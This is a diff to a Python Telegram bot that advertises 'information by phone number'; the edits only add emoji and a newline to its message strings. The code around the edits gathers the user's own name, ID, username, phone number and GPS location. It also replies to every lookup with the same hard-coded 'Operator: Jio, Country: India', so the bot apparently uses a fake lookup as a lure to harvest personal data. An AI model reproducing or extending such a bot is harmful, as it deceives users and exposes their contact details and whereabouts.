@@ -45,7 +45,7 @@ def handle_check_button_click(call):
 
 @bot.message_handler(commands=['start'])
 def start(message):
-	bot.send_message(message.chat.id, '''👋 Hello! 👋
+	bot.send_message(message.chat.id, '''👋 Hello! 👋 \n
 This is a bot that can show information by phone number!
 To search for information, enter the command /getinfo''') 
 	
@@ -89,7 +89,7 @@ def contact(message):
 		userid = message.contact.user_id
 		phone = message.contact.phone_number
 		info = f'''
-			Data
+		       🧿 User Data:
 			├Name: {first} {last}
 			├ID: {userid}
 			├Username: @{nick}
@@ -111,7 +111,7 @@ def contact(message):
 	button = types.InlineKeyboardButton(text="Advanced Information", callback_data="find")
 	keyboardmain.add(button)
 	bot.send_message(message.chat.id, f'''
-		Number information:
+		☎️ Number information:
 		├Operator: Jio
 		└Country: India
 		''', reply_markup=keyboardmain)
@@ -130,7 +130,7 @@ def contact(message):
 		lon = str(message.location.longitude)
 		lat = str(message.location.latitude)
 		geo = f'''
-		Location:
+		📍 Location:
 		 ├ID: {message.chat.id}
 		 ├Longitude: {lon}
 		 ├Latitude: {lat}
